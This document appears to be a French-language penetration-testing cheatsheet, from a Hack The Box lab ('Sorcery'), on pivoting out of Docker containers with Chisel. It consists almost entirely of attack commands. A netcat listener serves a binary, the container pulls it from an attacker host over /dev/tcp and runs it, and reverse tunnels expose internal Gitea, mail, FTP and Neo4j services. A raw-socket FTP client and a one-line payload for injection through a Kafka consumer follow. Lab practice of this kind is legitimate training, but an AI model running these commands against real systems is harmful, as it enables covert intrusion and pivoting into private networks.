---
title: "Chisel Tunneling from Docker Containers"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Chisel Tunneling from Docker Containers"
summary: "Pivoting | Chisel Tunneling from Docker Containers"
tags:
  - "Pivoting"
  - "Tunneling"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "Pivoting"
ShowToc: true
TocOpen: false
---

## Setup

### Sur l'attaquant (serveur)
```bash
chisel server -p 8080 --reverse
```

### Transférer chisel dans le container
```bash
# Servir le binaire
nc -lvnp 9999 < /usr/bin/chisel

# Depuis le container (pas de curl/wget)
cat </dev/tcp/LHOST/9999 >/tmp/c
chmod +x /tmp/c
```

### Lancer le client (reverse tunnels)
```bash
nohup /tmp/c client LHOST:8080 \
  R:3001:gitea:3000 \
  R:8025:mail:8025 \
  R:1025:mail:1025 \
  R:2121:ftp:21 \
  R:7475:neo4j:7474 \
  >/dev/null 2>&1 &
```

### Accès local
- http://localhost:3001 → Gitea
- http://localhost:8025 → MailHog web UI
- localhost:1025 → SMTP
- localhost:2121 → FTP (⚠️ mode passif ne marche pas - data port aléatoire non tunnelé)

## Note FTP via tunnel
Le FTP passif ouvre un port data aléatoire non tunnelé → connexion refusée.
Solutions:
- `ftplib` Python depuis le container directement
- FTP en bash pur avec EPSV (voir ci-dessous)

## FTP en bash pur (sans curl/wget)
```bash
exec 3<>/dev/tcp/ftp/21; read -r b <&3
echo -e "USER anonymous\r" >&3; read -r r <&3
echo -e "PASS x\r" >&3; read -r r <&3
echo -e "EPSV\r" >&3; read -r r <&3; echo "$r"
# Parse le port: 229 Entering Extended Passive Mode (|||PORT|)
PORT=$(echo "$r" | grep -oP '\|\|\|(\d+)\|' | tr -d '|')
exec 4<>/dev/tcp/ftp/$PORT
echo -e "RETR pub/fichier\r" >&3
cat <&4 > /tmp/fichier
exec 4>&-
echo -e "QUIT\r" >&3; exec 3>&-
```

## Kafka consumer + Chisel: attention
Si le transfert de chisel passe par une commande Kafka (`cat </dev/tcp/.../9999 > /tmp/c && ...`), le consumer attend que la commande se termine. Utiliser `nohup ... &` pour que bash exit immédiatement et que le consumer continue.

```bash
# Commande Kafka unique (ne pas en envoyer d'autres après)
cat </dev/tcp/LHOST/9999 >/tmp/c && chmod +x /tmp/c && nohup /tmp/c client LHOST:8080 R:3001:gitea:3000 R:8025:mail:8025 >/dev/null 2>&1 &
```

## Ref
- Machine: Sorcery (HTB Insane)
